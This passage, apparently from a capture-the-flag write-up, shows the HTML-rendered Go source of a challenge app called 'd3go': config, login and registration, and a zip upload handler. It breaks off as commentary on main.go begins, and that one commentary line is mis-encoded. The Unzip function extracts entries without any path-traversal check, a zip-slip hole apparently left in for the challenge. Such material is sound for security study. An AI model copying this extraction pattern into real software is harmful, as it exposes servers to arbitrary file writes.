class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¨å¾®å®¡ä¸€ä¸‹é¢˜ï¼Œé¦–å…ˆåœ¨main.goæœ‰è¿™ä¹ˆä¸€æ®µ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span 